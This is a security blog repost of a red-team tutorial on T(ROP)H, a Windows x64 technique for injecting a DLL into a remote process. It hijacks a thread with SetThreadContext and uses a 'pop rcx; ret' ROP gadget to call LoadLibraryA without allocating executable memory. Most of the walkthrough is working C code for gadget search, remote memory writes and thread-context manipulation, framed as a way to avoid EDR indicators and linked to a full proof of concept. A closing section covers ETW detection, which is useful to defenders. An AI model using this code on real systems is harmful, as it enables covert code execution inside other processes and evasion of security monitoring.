# https://core-jmp.org/2026/03/stealth-injection-with-rop-thread-hijacking-without-executable-memory/

[![Stealth Injection with ROP: Thread Hijacking Without Executable Memory](https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.05.17-300x300.png)](https://core-jmp.org/2026/03/stealth-injection-with-rop-thread-hijacking-without-executable-memory/)

March 27, 2026

by[oxfemale](https://core-jmp.org/author/oxfemale/ "View all posts by oxfemale")

withno comment

[EDR](https://core-jmp.org/security/edr/ "View all posts in EDR") [Injection](https://core-jmp.org/security/windows/injection/ "View all posts in Injection") [RedTeam](https://core-jmp.org/security/redteam/ "View all posts in RedTeam") [ROP](https://core-jmp.org/security/rop/ "View all posts in ROP") [winapi](https://core-jmp.org/security/windows/winapi/ "View all posts in winapi") [windows](https://core-jmp.org/security/windows/ "View all posts in windows")

[Original text](https://infosecwriteups.com/t-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca) by [Umarex](https://medium.com/@umarex01?source=post_page---byline--d746c102a9ca---------------------------------------)

_The article introduces a technique called **T(ROP)H (Thread Hijacking with ROP)**, which enables DLL injection into a remote Windows process without allocating executable memory. Traditional thread hijacking typically allocates memory with execute permissions and places shellcode there before redirecting a thread’s instruction pointer to the payload. However, allocating executable memory is a strong indicator of malicious activity and is often monitored by security solutions. The presented method avoids this by combining **thread hijacking with Return-Oriented Programming (ROP)**. Instead of injecting shellcode, the technique writes the path of a DLL into the target process memory and constructs a small **ROP chain** that prepares the required registers and calls `LoadLibraryA` to load the DLL. A key challenge is that `SetThreadContext` cannot directly modify certain volatile registers needed for function arguments, such as **RCX in the Windows x64 calling convention**. To solve this, the attacker locates gadgets such as **`pop rcx; ret`** in system libraries (e.g., `ntdll.dll`) and uses them to control execution flow. The result is a stealthier injection method that reduces typical detection indicators while still achieving remote code execution._

![](https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.06.22.png)

## TL;DR

Allocating memory with **EXECUTE** privileges in the context of another process is a well-known IOC, as it suggests that some code may be preparing to execute in a space outside of the attacker’s original process.

Traditional thread hijacking involves writing shellcode into a memory area with execution privileges and then redirecting the **RIP** to execute it.

An alternative approach is to load a DLL, which avoids the need for executable memory allocation. However, this introduces a new challenge: passing the argument to LoadLibrary.

The **SetThreadContext** API does not allow overwriting of volatile registers such as **RCX**, which is required to pass the argument. This limitation can be circumvented by constructing a small ROP chain that allows the necessary register to be manipulated and the injected DLL to be successfully executed.

## CODE WALKTHROUGH

### 1\. Find Gadget

The first thing we need to do is find a suitable ROP gadget. In this case, we need to populate the RCX register because the [Windows x64 calling convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170) says that the first function argument is passed via RCX. We need to find a gadget that does a ‘pop rcx’ followed by a ‘ret’. This lets us transfer the full path of the DLL from the stack into the RCX register. Once we’ve done that, we can jump straight to the ‘LoadLibraryA’ function in ‘kernel32.dll’.

One good approach could be to start with a quick analysis of system libraries using tools like [ROPGadget](https://github.com/JonathanSalwan/ROPgadget). Once you’ve found a suitable gadget, the next step is to locate its address at runtime. You can do this using a function similar to the one shown below, which dynamically retrieves the address of the ‘pop rcx; ret’ gadget from ‘ntdll.dll’.

```
BOOL FindGadgetInFunction(const CHAR* moduleName, BYTE* gadget, SIZE_T gadgetSize, LPVOID* oFoundAddress)
{
 HMODULE hModule = GetModuleHandleA(moduleName);
 if (hModule == NULL)
  return FALSE;

 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
 PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
 PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

 BYTE* addressStart = (BYTE*)hModule;
 DWORD textSectionSize = pSectionHeader->Misc.VirtualSize;

 for (DWORD i = 0; i < textSectionSize - 3; i++) {
  if (memcmp(addressStart + i, gadget, gadgetSize) == 0) {
   *oFoundAddress = (LPVOID)(addressStart + i);
   FreeLibrary(hModule);
   return TRUE;
  }
 }

 FreeLibrary(hModule);
 return FALSE;
}
```

### 2\. Write the DLL path into the target process’s memory.

Next, you need to write the path of the DLL you want to inject into the target process’s memory. This is normally done using the standard method of allocating memory in the remote process with ‘VirtualAllocEx’, and then writing the full DLL path into this allocated space using ‘WriteProcessMemory’.

```
// Allocate rw memory in the target process for the DLL path
 pRemoteDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 if (pRemoteDllPath == NULL) {
  printf("[-] Remote memory allocation failed\n");
  PrintLastError();
  goto Exit;
 }
 printf("[+] Remote memory allocated successfully: %p\n", pRemoteDllPath);

 // Write the DLL path into the allocated memory in the target process
 if (!WriteProcessMemory(hProcess, pRemoteDllPath, dllPath, strlen(dllPath) + 1, NULL)) {
  printf("[-] Failed to write to the target process memory\n");
  PrintLastError();
  VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
  goto Exit;
 }
 printf("[+] DLL path successfully written to the target process memory\n");
```

### 3\. Modify remote thread context

Now things are getting interesting. Once we’ve found the target remote thread, we can update the stack and registers we’ve got control of. This includes the instruction pointer (RIP) and the stack pointer (RSP).

There are a few key steps to follow to get the ROP chain working and load the DLL into the target process:

- **Suspend the Thread:** First, we use the ‘SuspendThread’ API to suspend the target thread. This lets us safely modify its context without interfering with its ongoing execution.
- **Modify the RIP and RSP registers**: The RIP is updated to point to the address of our ROP gadget (the ‘pop rcx; ret’ sequence). The RSP is adjusted to allocate 32 bytes (4 DWORD64) on the stack.
- **Prepare and write the buffer to the stack**: The buffer contains the necessary values for the ROP chain execution:

1. At the top of the stack, we put the memory address that holds the path to the DLL we want to inject. When the gadget runs, the ‘pop rcx’ instruction will move this value from the stack into the RCX register.
2. Next, we put the address of the ‘LoadLibraryA’ function. After the ‘pop rcx’, the ‘ret’ instruction will pop this address into the RIP register, which will cause the thread to jump to LoadLibraryA and execute it with the path from RCX.
3. In the third position, we place the return address for the ‘LoadLibraryA’ function. For simplicity, this points to the ExitThread function, which ensures that the thread terminates cleanly once the DLL is loaded.

- **Resume the Thread**: thread can be now resumed using ‘ResumeThread’.

```
  // Suspend the thread to modify its context
 SuspendThread(hRemoteThread);
 GetThreadContext(hRemoteThread, &threadContext);

 // Prepare the buffer with the DLL path and function pointers.

 // RCX will hold the address of the DLL path in the target process.
 // This value will be passed to LoadLibraryA after the "pop rcx; ret" gadget is executed.
 *(DWORD64*)(buffer) = (DWORD64)pRemoteDllPath;

 // The next value in the buffer is the return address, which will be the address of LoadLibraryA.
 // After the "pop rcx; ret" gadget, the execution will jump to LoadLibraryA and use the
 // value in RCX (the DLL path) as its argument.
 *(DWORD64*)(buffer + 8) = (DWORD64)LoadLibraryA;

 // After LoadLibraryA finishes executing and the DLL is loaded, the thread should cleanly exit.
 // We ensure that the next value on the stack after the gadget execution is the address of ExitThread.
 *(DWORD64*)(buffer + 16) = (DWORD64)ExitThread;

 // Adjust the stack pointer (RSP). The decrement of 32 bytes ensures that the stack
 // is properly aligned and avoids overwriting any important data.
 threadContext.Rsp -= 32;

 // Set the instruction pointer (RIP) to the gadget "pop rcx; ret".
 threadContext.Rip = (DWORD64)pPopRcxRetGadgetAddr;

 // Write the modified context (buffer) to the target thread's stack
 if (!WriteProcessMemory(hProcess, (PVOID)(threadContext.Rsp), buffer, 24, NULL)) {
  printf("[-] Failed to write to the target thread's stack\n");
  PrintLastError();
  VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
  goto Exit;
 }
 printf("[+] Successfully wrote to the target thread's stack\n");

 // Overwrite the target thread's context with the new values
 if (!SetThreadContext(hRemoteThread, &threadContext)) {
  printf("[-] Failed to set the target thread's context\n");
  VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
  goto Exit;
 }
 printf("[+] Thread context successfully overwritten\n");

 // Wait before resuming the thread to ensure the context has been modified
 Sleep(2000);

 // Resume the hijacked thread
 ResumeThread(hRemoteThread);
 printf("[+] Remote thread successfully hijacked\n");
```

## EXECUTION

The first image shows what the thread looked like before we made any changes to the context. At this point, the thread is paused and its registers and stack are left untouched. The instruction pointer (RIP) is pointing to where the code was originally executed, and the stack pointer (RSP) is managing the current call stack.

![](https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.09.22.png)

The second image shows what happens to the thread after the context has been modified. At this point, the instruction pointer (RIP) has been updated to point to our ROP gadget (pop rcx; ret), and the stack pointer (RSP) has been adjusted to allocate space for the prepared buffer. The buffer has been written to the stack, along with the DLL path address, the address of the ‘LoadLibraryA’ function, and the return address pointing to ‘ExitThread’.

![](https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.09.34.png)

And this is what we got!

![](https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.10.46.png)

We can also check if the DLL injection worked by looking at the results in Process Monitor (ProcMon).

![](https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.11.15.png)

## DETECTABILITY

Although this technique avoids allocating executable memory, it can still be easily detected by EDR because it relies on the well-known ‘SetThreadContext’ API.

As well explained in [David Wells’ post](https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d), the API notifies two differents ETW providers during its execution:

_This step notifies that the SetThreadContext call occurred so that consumers of this provider may be notified. We actually see two different ETW writes occur here, each for different providers:_

**_Microsoft-Windows-Kernel-Audit-API-Calls_**

**_Microsoft-Windows-Threat-Intelligence_**

_From this, it’s clear that SetThreadContext event logging is not just for diagnostic/audit consumers, but also for security consumers. From the little I found online, it appeared some Microsoft security tools, such as Windows Defender APT, consume such Threat-Intel events for EDR purposes, and it makes sense being that SetThreadContext can have malicious usages that should be monitored for._

## CONCLUSIONS

We’ve seen how to get around the usual memory allocation IOC and API limits by using ROP chains to perform a DLL injection in a Windows x64 environment. By tweaking the thread’s context we were able to run a controlled ROP chain to load a DLL without allocating executable memory.

You can find the full proof-of-concept (PoC) implementation, with all the steps and code here: [https://gist.github.com/UmaRex01/20f7a349539ceea76a4ad3d8ce7a6078](https://gist.github.com/UmaRex01/20f7a349539ceea76a4ad3d8ce7a6078)

### Share this:

- [Share on Facebook (Opens in new window)Facebook](https://core-jmp.org/2026/03/stealth-injection-with-rop-thread-hijacking-without-executable-memory/?share=facebook&nb=1)
- [Share on X (Opens in new window)X](https://core-jmp.org/2026/03/stealth-injection-with-rop-thread-hijacking-without-executable-memory/?share=x&nb=1)

### Like this:

LikeLoading...

Comments are closed.

Shopping Basket

%d